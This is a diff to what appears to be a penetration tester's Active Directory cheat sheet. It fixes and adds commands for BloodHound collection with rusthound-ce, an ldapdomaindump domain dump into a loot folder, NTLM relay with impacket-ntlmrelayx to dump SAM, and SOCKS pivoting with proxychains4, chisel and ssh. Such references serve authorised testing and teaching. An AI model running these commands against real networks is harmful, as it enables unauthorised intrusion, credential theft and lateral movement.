@@ -359,7 +359,13 @@ nxc ldap <ip_address> -u <user> -p <password> --bloodhound --collection All --dn
 bloodhound-ce-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
 # rusthound-ce is the fast ALTERNATE collector on a large domain — one static Rust binary,
 # no Python chain. UPSTREAM (`cargo install rusthound-ce`), not apt; complement, not replacement:
-rusthound-ce -d <domain> -u <user>@<domain> -p <password> --dc <ip_address> -z
+rusthound-ce -d <domain> -u <user>@<domain> -p <password> -i <ip_address> -z
+# NOT --dc (that's the impacket/certipy idiom): RustHound-CE takes -i/--ldapip for the DC IP, -f/--ldapfqdn for its FQDN.
+# Whole-domain dump to browsable HTML + JSON + greppable TSV — the fast triage read
+# while BloodHound ingests. apt name is python3-ldapdomaindump; the binary is bare
+# ldapdomaindump (that dual name is why bootstrap's non-Kali pipx route uses the bare one):
+ldapdomaindump -u '<domain>\<user>' -p <password> -o loot/ldd <ip_address>
+# -p takes an LM:NTLM hash too. -r resolves computer hostnames: accurate, but loud on a big domain.
 
 # Escalation primitives: AS-REP / Kerberoast (above) / unconstrained-deleg / GenericAll / DCSync.
 certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1–ESC17)
@@ -418,7 +424,8 @@ sudo mitm6 -d <domain>                                       # IPv6/DNS takeover
 # To RELAY not crack: set SMB=Off + HTTP=Off in Responder.conf (/etc/ or /usr/share/responder/) first, then:
 impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
 impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
-proxychains nxc smb <ip_address>                                   # ride the relayed session
+proxychains4 nxc smb <ip_address>                                  # ride the relayed session
+# the binary is proxychains4 — the apt pkg Provides: proxychains but ships NO such binary.
 ////////////////////////////////////////
 
 
@@ -626,13 +633,13 @@ Pivoting & tunneling
 ++++++++++++++++++++++++++++++++++++++++
 ssh -L 8080:127.0.0.1:80 <user>@<ip_address>      # local forward
 ssh -R 9001:127.0.0.1:9001 <user>@<ip_address>    # remote forward (callback)
-ssh -D 1080 <user>@<ip_address>                   # dynamic SOCKS (+ proxychains)
+ssh -D 1080 <user>@<ip_address>                   # dynamic SOCKS (+ proxychains4)
 
 chisel server -p 8000 --reverse                    # attacker
 ./chisel client <your-ip>:8000 R:socks             # target
 # ligolo-ng (modern, tun-based): proxy on attacker, agent on target, then `session`
 #   -> add a route to the internal subnet via the ligolo iface.
-proxychains -q nxc smb <internal-ip>               # route tools through the SOCKS proxy
+proxychains4 -q nxc smb <internal-ip>              # route tools through the SOCKS proxy
 ////////////////////////////////////////
 
 
